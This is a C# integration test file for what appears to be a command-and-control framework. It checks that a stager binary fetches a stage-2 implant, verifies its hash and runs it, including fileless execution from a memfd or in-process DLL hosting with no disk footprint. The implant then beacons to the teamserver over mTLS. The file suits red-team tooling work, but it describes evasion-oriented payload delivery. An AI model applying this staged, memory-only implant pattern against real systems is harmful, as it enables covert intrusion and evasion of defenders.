using System.Diagnostics;
using System.Net.Http.Json;
using System.Text;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Rod.Transport;
using Rod.Transport.Endpoints;

namespace Rod.Integration.Tests;

/// <summary>
/// Acceptance for the stage-1 stager output class (architecture.md Sec 6):
/// building a stager yields a runnable stage-1 that pulls its stage-2 and
/// enrols. The test stands up a real teamserver, builds a stage-2 implant and
/// then a stager referencing it through the operator build API, downloads the
/// stager executable, and runs it as a real subprocess -- with no arguments
/// and no environment, exactly as it lands in the field. Each build bakes its
/// own credential: the stager's gates the fetch (one served download spends
/// one use), and the stage-2's is what its enroll spends. The stager fetches
/// the stage-2 over the anonymous listener, verifies the baked sha256,
/// executes the fetched artifact -- and the stage-2 enrols on its own baked
/// credential and appears on the roster.
/// </summary>
public class StagerEndToEndTests
{
    [DotNetFact]
    public async Task Stager_FetchesStage2_AndTheStage2_Enrols()
    {
        await using var env = await TestEnv.StartAsync();
        await env.CreateEngagementAsync();

        // Build the stage-2 first: a linux/amd64 single-file implant baked for
        // this teamserver's enroll endpoint, sleeping at a 1s beacon cadence.
        // The beacon host is baked too -- the split-socket shape (enroll on
        // the plain-HTTP listener, contacts on the mTLS port) is now a
        // first-class build input, so the artifact needs no run-time override.
        var enrollUrl = $"http://127.0.0.1:{env.HttpPort}/implants/enroll";
        var stage2 = await env.BuildAsync(new
        {
            Class = "Stage2",
            TargetOs = "linux",
            TargetArch = "amd64",
            Endpoint = enrollUrl,
            BeaconEndpoint = $"https://127.0.0.1:{env.MtlsPort}",
            SleepSeconds = 1.0,
            JitterSeconds = 0.0,
        });
        Assert.Equal("Stage2", stage2.Class);

        // Then the stager: the minimal loader with the stage-2's id and
        // fingerprint baked in as its fetch reference.
        var stager = await env.BuildAsync(new
        {
            Class = "Stager",
            TargetOs = "linux",
            TargetArch = "amd64",
            Endpoint = enrollUrl,
            Stage2PayloadId = stage2.ArtifactId,
        });
        Assert.Equal("Stager", stager.Class);

        // Download the stager executable and run it as the operator would drop
        // it on a target: a bare binary, no arguments, no environment -- each
        // build's bake carries its own credential (the loader's gates the
        // fetch, the stage-2's enrolls), the beacon host, and the CA pin. The
        // single-file stage-2 runs from the loader's temp write (a bundle
        // reads its own file to mount the runtime); the memory paths have
        // their own legs below.
        var (process, stderr, outDir) = await LaunchStagerAsync(env, stager);

        try
        {
            // The acceptance point: the stage-2 enrolled through the stager's
            // fetch-and-run, and it is live on the roster. The loader's own
            // exit is not the AC (it waits on the stage-2, which runs until
            // killed); the enrolled, online stage-2 is.
            var implantId = await WaitForStage2OnlineAsync(env, stager.EngagementId, TimeSpan.FromSeconds(60), stderr);
            Assert.False(string.IsNullOrEmpty(implantId));
        }
        finally
        {
            StopStager(process, outDir);
        }
    }

    [DotNetFact]
    public async Task Stager_RunsAnAotStage2_FromMemory_NothingLands()
    {
        // The native AOT stage-2 is a plain ELF with no self-reference, the
        // one executable shape that runs from an anonymous fd: the loader
        // writes the fetched bytes to a memfd and execveat's into them, so
        // the stage-2 exists only in memory. The acceptance is the enrolled,
        // online stage-2 plus an empty rod-stager-* temp footprint -- the
        // loader's temp-file fallback never ran.
        await using var env = await TestEnv.StartAsync();
        await env.CreateEngagementAsync();

        var enrollUrl = $"http://127.0.0.1:{env.HttpPort}/implants/enroll";
        var stage2 = await env.BuildAsync(new
        {
            Class = "Stage2",
            TargetOs = "linux",
            TargetArch = "amd64",
            Endpoint = enrollUrl,
            BeaconEndpoint = $"https://127.0.0.1:{env.MtlsPort}",
            SleepSeconds = 1.0,
            JitterSeconds = 0.0,
            Format = "aot",
        });
        var stager = await env.BuildAsync(new
        {
            Class = "Stager",
            TargetOs = "linux",
            TargetArch = "amd64",
            Endpoint = enrollUrl,
            Stage2PayloadId = stage2.ArtifactId,
        });

        var landedBefore = StagerTempDirs();
        var (process, stderr, outDir) = await LaunchStagerAsync(env, stager);
        try
        {
            var implantId = await WaitForStage2OnlineAsync(env, stager.EngagementId, TimeSpan.FromSeconds(60), stderr);
            Assert.False(string.IsNullOrEmpty(implantId));
            Assert.Equal(landedBefore.Length, StagerTempDirs().Length);
        }
        finally
        {
            StopStager(process, outDir);
        }
    }

    [DotNetFact]
    public async Task Stager_HostsADllStage2_InProcess_NothingLands()
    {
        // The dll stage-2 turns the loader into an in-memory host: the
        // fetched bundle loads inside the stager process (dependencies
        // pre-loaded from the zip, entry point invoked), enrols from that
        // same process, and no byte of the stage-2 appears on any filesystem
        // -- the acceptance is the enrolled, online stage-2 plus an empty
        // rod-stager-* temp footprint.
        await using var env = await TestEnv.StartAsync();
        await env.CreateEngagementAsync();

        var enrollUrl = $"http://127.0.0.1:{env.HttpPort}/implants/enroll";
        var stage2 = await env.BuildAsync(new
        {
            Class = "Stage2",
            TargetOs = "linux",
            TargetArch = "amd64",
            Endpoint = enrollUrl,
            BeaconEndpoint = $"https://127.0.0.1:{env.MtlsPort}",
            SleepSeconds = 1.0,
            JitterSeconds = 0.0,
            Format = "dll",
        });
        var stager = await env.BuildAsync(new
        {
            Class = "Stager",
            TargetOs = "linux",
            TargetArch = "amd64",
            Endpoint = enrollUrl,
            Stage2PayloadId = stage2.ArtifactId,
        });

        var landedBefore = StagerTempDirs();
        var (process, stderr, outDir) = await LaunchStagerAsync(env, stager);
        try
        {
            var implantId = await WaitForStage2OnlineAsync(env, stager.EngagementId, TimeSpan.FromSeconds(60), stderr);
            Assert.False(string.IsNullOrEmpty(implantId));
            Assert.Equal(landedBefore.Length, StagerTempDirs().Length);
        }
        finally
        {
            StopStager(process, outDir);
        }
    }

    // Downloads a built stager and runs it exactly as it lands in the field:
    // a bare executable, no arguments, no environment. Returns the running
    // process with stderr captured (for the failure message) and the download
    // dir to clean up.
    private static async Task<(Process Process, StringBuilder Stderr, string OutDir)> LaunchStagerAsync(
        TestEnv env, BuildBody stager)
    {
        var outDir = Path.Combine(Path.GetTempPath(), "rod-e2e-stager-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(outDir);
        var stagerPath = Path.Combine(outDir, "Rod.Stager");
        {
            using var download = await env.Http.GetAsync(
                $"/engagements/{stager.EngagementId}/payloads/{stager.ArtifactId}");
            download.EnsureSuccessStatusCode();
            await File.WriteAllBytesAsync(stagerPath, await download.Content.ReadAsByteArrayAsync());
        }
        if (!OperatingSystem.IsWindows())
        {
            File.SetUnixFileMode(stagerPath,
                UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        }

        var stderr = new StringBuilder();
        var process = Process.Start(new ProcessStartInfo
        {
            FileName = stagerPath,
            UseShellExecute = false,
            RedirectStandardError = true,
        });
        Assert.NotNull(process);
        process.ErrorDataReceived += (_, e) => { if (e.Data is not null) stderr.AppendLine(e.Data); };
        process.BeginErrorReadLine();
        return (process!, stderr, outDir);
    }

    private static void StopStager(Process process, string outDir)
    {
        if (!process.HasExited)
        {
            try { process.Kill(entireProcessTree: true); } catch { }
            process.WaitForExit(5000);
        }
        process.Dispose();
        try { Directory.Delete(outDir, recursive: true); } catch { }
    }

    // The loader's temp-file fallback lands under this prefix; the in-memory
    // paths (the dll host, the Linux memfd exec) never create one.
    private static string[] StagerTempDirs()
        => Directory.GetDirectories(Path.GetTempPath(), "rod-stager-*");

    // Polls the engagement's implant listing until a Stage-2 is enrolled and
    // online -- the state the stager's fetch-and-run exists to produce.
    private static async Task<string> WaitForStage2OnlineAsync(
        TestEnv env, string engagementId, TimeSpan deadline, StringBuilder stderr)
    {
        var end = DateTimeOffset.UtcNow + deadline;
        while (DateTimeOffset.UtcNow < end)
        {
            try
            {
                var implants = await env.Http.GetFromJsonAsync<ImplantEndpoints.ImplantResponse[]>(
                    $"/engagements/{engagementId}/implants");
                var online = implants?.FirstOrDefault(i => i.Class == "Stage2" && i.IsOnline);
                if (online is not null)
                    return online.ImplantId;
            }
            catch (HttpRequestException)
            {
                // The listing read races the enrollment; retry.
            }
            await Task.Delay(500);
        }
        throw new TimeoutException(
            "The stage-2 enrolled by the stager did not appear online. Stager stderr:\n" + stderr);
    }

    private sealed class BuildBody
    {
        public string ArtifactId { get; set; } = "";
        public string EngagementId { get; set; } = "";
        public string Class { get; set; } = "";
    }

    /// <summary>
    /// A real Kestrel teamserver with the mTLS implant endpoint bound, plus a
    /// plain-HTTP operator/enroll API, logged in. Mirrors the
    /// DotNetImplantTests harness; the builds bake everything the artifacts
    /// need, so no CA file or credential is handed around.
    /// </summary>
    private sealed class TestEnv : IAsyncDisposable
    {
        public IHost Host { get; private set; } = null!;
        public HttpClient Http { get; private set; } = null!;
        public int MtlsPort { get; private set; }
        public int HttpPort { get; private set; }

        public static async Task<TestEnv> StartAsync()
        {
            var env = new TestEnv();
            env.MtlsPort = TestSupport.GetFreeTcpPort();
            env.HttpPort = TestSupport.GetFreeTcpPort();

            var config = AuthenticatedHost.BuildConfig();
            env.Host = TransportHost.CreateHostBuilder(
                    configureServices: services => AuthenticatedHost.ComposeServices(services, config),
                    mapEndpoints: endpoints => AuthenticatedHost.ComposeEndpoints(endpoints),
                    configuration: config)
                .ConfigureWebHost(webBuilder => webBuilder
                    .UseRodMtls(env.MtlsPort)
                    .ConfigureKestrel(kestrel => kestrel.ListenLocalhost(env.HttpPort)))
                .Build();
            await env.Host.StartAsync();

            env.Http = new HttpClient(new CookieHandler(new HttpClientHandler()))
            {
                BaseAddress = new Uri($"http://127.0.0.1:{env.HttpPort}"),
            };
            await AuthenticatedHost.LoginAsync(env.Http);
            return env;
        }

        public async Task CreateEngagementAsync()
        {
            var createResponse = await Http.PostAsJsonAsync("/engagements", new EngagementEndpoints.CreateEngagementRequest(
                Name: "Operation Stager Slice"));
            createResponse.EnsureSuccessStatusCode();
            var created = await createResponse.Content.ReadFromJsonAsync<EngagementEndpoints.EngagementResponse>();
            EngagementId = created!.EngagementId;
        }

        public string? EngagementId { get; private set; }

        public async Task<BuildBody> BuildAsync(object request)
        {
            Assert.NotNull(EngagementId);
            var response = await Http.PostAsJsonAsync($"/engagements/{EngagementId}/payloads", request);
            response.EnsureSuccessStatusCode();
            var body = await response.Content.ReadFromJsonAsync<BuildBody>();
            Assert.NotNull(body);
            return body!;
        }

        public async ValueTask DisposeAsync()
        {
            Http?.Dispose();
            if (Host is not null)
                await Host.StopAsync();
            Host?.Dispose();
        }
    }
}
